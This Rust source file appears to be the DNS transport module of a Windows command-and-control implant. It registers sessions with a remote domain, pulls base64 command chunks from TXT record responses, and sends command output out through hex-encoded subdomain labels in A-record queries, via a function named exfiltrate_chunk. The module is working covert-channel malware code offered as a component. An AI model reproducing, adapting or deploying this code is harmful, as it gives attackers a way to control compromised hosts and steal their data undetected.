use base64::Engine;
use std::{io, ptr};

use rand::Rng;
use std::ffi::{CString, OsString};
use std::os::windows::ffi::OsStrExt;
use widestring::WideCString;
use windows_sys::core::{PSTR};
use windows_sys::Win32::Foundation::{ERROR_SUCCESS};
use windows_sys::Win32::NetworkManagement::Dns::*;
use windows_sys::Win32::Networking::WinSock::{
    inet_pton, AF_INET, IN_ADDR, IN_ADDR_0, SOCKADDR_IN,
};

use base64::prelude::BASE64_STANDARD;

use crate::command::{CommandDetails, CommandInfo};
use crate::result::CommandResult;
use crate::session::Session;
use crate::transport::{LastOne, Transport};

const MAX_DNS_QUERY_SIZE: usize = 255;

#[cfg(windows)]
pub struct DNS {
    pub server: Option<String>,
    pub domain: String,

    dns_exfiltrate_size: usize,

    session: Session,
}

#[cfg(not(windows))]
pub struct DNS {
    pub server: Option<String>,
    pub domain: String,

    dns_exfiltrate_size: usize,

    session: Session,
}

pub enum DNSRecord {
    A,
    AAAA,
    TXT,
}

#[derive(Debug)]
pub enum DnsError {
    WindowsError(u32),
    IoError(io::Error),
    InvalidServerIp,
}

impl From<io::Error> for DnsError {
    fn from(err: io::Error) -> Self {
        DnsError::IoError(err)
    }
}

fn generate_blob(length: usize) -> String {
    rand::thread_rng()
        .sample_iter(&rand::distributions::Alphanumeric)
        .take(length)
        .map(char::from)
        .collect()
}

impl Transport for DNS {
    fn register_session(&self) -> Result<(), String> {
        let query = format!(
            "{}.{}.{}.{}",
            self.session.project_id,
            self.session.id,
            generate_blob(4),
            self.domain
        );

        return match self.dns_request(DNSRecord::AAAA, query.as_str()) {
            Ok(_) => Ok(()),
            Err(e) => Err(format!("Failed to register session: {:?}", e)),
        };
    }

    fn command_info(&self) -> Result<Option<CommandInfo>, String> {
        let query = format!("{}.{}.{}", self.session.id, generate_blob(4), self.domain,);

        let response = match self.dns_request(DNSRecord::TXT, query.as_str()) {
            Ok(Some(resp)) => resp.join(""),
            Err(e) => return Err(format!("Failed to lookup TXT records: {:?}", e)),
            _ => return Err("Error with the TXT response".to_string()),
        };

        if response == "null" {
            return Ok(None);
        }

        match serde_json::from_str::<CommandInfo>(&response) {
            Ok(cmd_info) => Ok(Some(cmd_info)),
            Err(e) => {
                println!("Error deserializing the data: {}", e);
                Ok(None)
            }
        }
    }

    fn command_details(
        &self,
        command: &mut CommandInfo,
        offset: &mut u64,
    ) -> Result<LastOne, String> {
        let query = format!(
            "{}.{}.{}.{}.{}",
            generate_blob(1),
            offset,
            command.command_id,
            generate_blob(4),
            self.domain
        );

        let response = match self.dns_request(DNSRecord::TXT, query.as_str()) {
            Ok(Some(resp)) => resp.join(""),
            Err(e) => return Err(format!("Failed to lookup TXT records: {:?}", e)),
            _ => return Err("Error with the TXT response".to_string()),
        };

        let decoded_bytes = BASE64_STANDARD
            .decode(response)
            .map_err(|_| "Could not decode command chunk".to_string())?;

        let decoded_str = String::from_utf8(decoded_bytes).unwrap_or_else(|_| "".to_string());

        let cmd_details = serde_json::from_str::<CommandDetails>(&decoded_str)
            .map_err(|e| format!("Error decoding cmd details {}", e))?;

        command.command += cmd_details.data.as_str();
        *offset += cmd_details.data.len() as u64;
        Ok(cmd_details.is_last_chunk)
    }

    fn set_result_info(&self, result: &CommandResult) -> Result<(), String> {
        let query = format!(
            "{}.{}.{}.{}.{}",
            generate_blob(1),
            result.result.len(),
            result.command_id,
            generate_blob(4),
            self.domain
        );

        return match self.dns_request(DNSRecord::A, query.as_str()) {
            Ok(_) => Ok(()),
            Err(e) => Err(format!("Could not set result info: {:?}", e)),
        };
    }

    fn exfiltrate_chunk(&self, result: &CommandResult, offset: &mut usize) -> Result<(), String> {
        dbg!(self.dns_exfiltrate_size);
        let upper_bound = {
            if *offset + self.dns_exfiltrate_size > result.result.len() {
                result.result.len()
            } else {
                *offset + self.dns_exfiltrate_size
            }
        };
        let chunk = &result.result[*offset..upper_bound];
        let encoded_chunk = add_dots(&to_hex(&chunk.to_string()), 60);

        let query = format!(
            "{}.{}.{}.{}.{}.{}",
            generate_blob(1),
            encoded_chunk,
            *offset,
            result.command_id,
            generate_blob(4),
            self.domain
        );

        return match self.dns_request(DNSRecord::A, query.as_str()) {
            Ok(_) => {
                *offset += self.dns_exfiltrate_size;
                Ok(())
            }
            Err(e) => Err(format!("Could not exfiltrate chunk: {:?}", e)),
        };
    }
}

impl DNS {
    pub fn new(server: Option<String>, domain: String, session: Session) -> DNS {
        DNS {
            server,
            dns_exfiltrate_size: (MAX_DNS_QUERY_SIZE - domain.len()) / 2 - 5 - 30, // TODO: make it more dynamic
            // divided by two as a result of hex encoding
            // -4 for blobs, -15 for dots and offsets
            domain,
            session,
        }
    }

    fn dns_request(
        &self,
        record_type: DNSRecord,
        domain: &str,
    ) -> Result<Option<Vec<String>>, DnsError> {
        let domain_name: Vec<u16> = OsString::from(domain)
            .encode_wide()
            .chain(Some(0).into_iter())
            .collect();

        let result: Result<Option<Vec<String>>, DnsError>;

        match &self.server {
            Some(ip) => result = dns_request_direct(record_type, domain_name, ip),
            None => result = dns_request_indirect(record_type, domain_name),
        }

        return match result {
            Ok(Some(txt_data)) => Ok(Some(txt_data)),
            Ok(None) => Ok(None),
            Err(error) => Err(error),
        };
    }
}

#[cfg(windows)]
fn dns_request_direct(
    record_type: DNSRecord,
    domain_name: Vec<u16>,
    server_ip: &str,
) -> Result<Option<Vec<String>>, DnsError> {
    let dns_record_type = match record_type {
        DNSRecord::A => DNS_TYPE_A,
        DNSRecord::AAAA => DNS_TYPE_AAAA,
        DNSRecord::TXT => DNS_TYPE_TEXT,
    };

    let mut txt_records = Vec::new();

    let query_result = &mut DNS_QUERY_RESULT {
        Version: DNS_QUERY_REQUEST_VERSION1,
        QueryStatus: 0,
        QueryOptions: 0,
        pQueryRecords: ptr::null_mut(),
        Reserved: ptr::null_mut(),
    };

    let mut addr = IN_ADDR {
        S_un: IN_ADDR_0 { S_addr: 0 },
    };
    let ip_cstring = match CString::new(server_ip) {
        Ok(cstr) => cstr,
        Err(_) => return Err(DnsError::InvalidServerIp),
    };
    let ip_ptr = ip_cstring.as_ptr() as PSTR;
    let result = unsafe { inet_pton(AF_INET as i32, ip_ptr, &mut addr as *mut _ as *mut _) };
    if result != 1 {
        return Err(DnsError::InvalidServerIp);
    }

    let mut server_addr = DNS_ADDR {
        MaxSa: [0; 32],
        Data: DNS_ADDR_0 {
            DnsAddrUserDword: [0; 8],
        },
    };
    let sockaddr_in_ptr = server_addr.MaxSa.as_mut_ptr() as *mut SOCKADDR_IN;
    unsafe {
        *sockaddr_in_ptr = SOCKADDR_IN {
            sin_family: AF_INET,
            sin_port: 0,
            sin_addr: addr,
            sin_zero: [0; 8],
        };
    }

    let mut server_list = DNS_ADDR_ARRAY {
        MaxCount: 0,
        AddrCount: 1,
        Tag: 0,
        Family: AF_INET,
        WordReserved: 0,
        Flags: 0,
        MatchFlag: 0,
        Reserved1: 0,
        Reserved2: 0,
        AddrArray: [server_addr],
    };

    let mut query_options = DNS_QUERY_REQUEST {
        Version: DNS_QUERY_REQUEST_VERSION1,
        QueryName: domain_name.as_ptr(),
        QueryType: dns_record_type,
        QueryOptions: (DNS_QUERY_BYPASS_CACHE | DNS_QUERY_NO_HOSTS_FILE) as u64,
        pDnsServerList: &mut server_list,
        InterfaceIndex: 0,
        pQueryCompletionCallback: None,
        pQueryContext: ptr::null_mut(),
    };

    let result_code = unsafe { DnsQueryEx(&mut query_options, query_result, ptr::null_mut()) };

    if result_code != ERROR_SUCCESS as i32 {
        return Err(DnsError::WindowsError(result_code as u32));
    }

    let query_result_ref = &*query_result;
    let mut current_record = query_result_ref.pQueryRecords as *const DNS_RECORDW;

    while !current_record.is_null() {
        let current_record_ref = unsafe { &*current_record };

        let txt_strings = handle_dns_result(&record_type, current_record_ref);

        if let Ok(Some(strings)) = txt_strings {
            txt_records.extend(strings);
        }

        current_record = current_record_ref.pNext;
    }

    unsafe { DnsFree(query_result.pQueryRecords as *mut _, DnsFreeRecordList) };

    if txt_records.is_empty() {
        Ok(None)
    } else {
        Ok(Some(txt_records))
    }
}

#[cfg(not(windows))]
fn dns_request_direct(
    record_type: DNSRecord,
    domain_name: Vec<u16>,
    server_ip: &str,
) -> Result<Option<Vec<String>>, DnsError> {
    panic!("Direct DNS requests are only supported on Windows")
}

#[cfg(windows)]
fn dns_request_indirect(
    record_type: DNSRecord,
    domain_name: Vec<u16>,
) -> Result<Option<Vec<String>>, DnsError> {
    let dns_record_type = match record_type {
        DNSRecord::A => DNS_TYPE_A,
        DNSRecord::AAAA => DNS_TYPE_AAAA,
        DNSRecord::TXT => DNS_TYPE_TEXT,
    };

    let mut txt_records = Vec::new();

    let mut result_buffer: *mut DNS_RECORDW = ptr::null_mut();

    let result_code = unsafe {
        DnsQuery_W(
            domain_name.as_ptr(),
            dns_record_type,
            DNS_QUERY_STANDARD,
            ptr::null_mut(),
            &mut result_buffer as *mut _ as *mut _,
            ptr::null_mut(),
        )
    };

    if result_code != ERROR_SUCCESS {
        return Err(DnsError::WindowsError(result_code));
    }

    let mut current_record = unsafe { &*result_buffer };
    loop {
        let txt_strings = handle_dns_result(&record_type, &current_record);

        if let Ok(Some(strings)) = txt_strings {
            txt_records.extend(strings);
        }

        current_record = unsafe {
            match current_record.pNext.as_ref() {
                Some(next_record) => next_record,
                None => break,
            }
        };
    }

    unsafe { DnsFree(result_buffer as *mut _, DnsFreeRecordList) };

    if txt_records.is_empty() {
        Ok(None)
    } else {
        Ok(Some(txt_records))
    }
}

#[cfg(not(windows))]
fn dns_request_indirect(
    record_type: DNSRecord,
    domain_name: Vec<u16>,
) -> Result<Option<Vec<String>>, DnsError> {
    panic!("Indirect DNS requests are only supported on Windows")
}

#[cfg(windows)]
fn handle_dns_result(
    record_type: &DNSRecord,
    result: &DNS_RECORDW,
) -> Result<Option<Vec<String>>, DnsError> {
    return match record_type {
        DNSRecord::A => {
            let ip_address = unsafe {
                let ip = result.Data.A.IpAddress;
                let ip_bytes = ip.to_be_bytes();
                format!(
                    "{}.{}.{}.{}",
                    ip_bytes[0], ip_bytes[1], ip_bytes[2], ip_bytes[3]
                )
            };
            dbg!(&ip_address);
            Ok(None)
        }
        DNSRecord::AAAA => {
            let ip_address = unsafe {
                let ip = result.Data.AAAA.Ip6Address;
                let ip_bytes = ip.IP6Word;
                format!(
                    "{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}",
                    ip_bytes[0],
                    ip_bytes[1],
                    ip_bytes[2],
                    ip_bytes[3],
                    ip_bytes[4],
                    ip_bytes[5],
                    ip_bytes[6],
                    ip_bytes[7]
                )
            };
            dbg!(ip_address);
            Ok(None)
        }
        DNSRecord::TXT => {
            let txt_record = unsafe { &result.Data.Txt };
            let mut txt_strings = Vec::new();
            let string_array_ptr = txt_record.pStringArray.as_ptr();
            for i in 0..txt_record.dwStringCount as usize {
                let txt_string = unsafe {
                    let string_ptr = *string_array_ptr.offset(i as isize);
                    let wide_cstring = WideCString::from_ptr_str(string_ptr);
                    wide_cstring.to_string_lossy()
                };
                txt_strings.push(txt_string);
            }

            Ok(Some(txt_strings))
        }
    };
}

fn to_hex(input: &String) -> String {
    input
        .chars()
        .map(|c| format!("{:02x}", c as u8))
        .collect::<Vec<_>>()
        .join("")
}

fn add_dots(input: &String, frequency: usize) -> String {
    if input.len() <= frequency {
        return input.clone();
    }

    input
        .chars()
        .enumerate()
        .map(|(i, c)| {
            if i % frequency == 0 {
                format!(".{}", c)
            } else {
                c.to_string()
            }
        })
        .collect::<Vec<_>>()
        .join("")
        .trim_matches('.')
        .to_string()
}
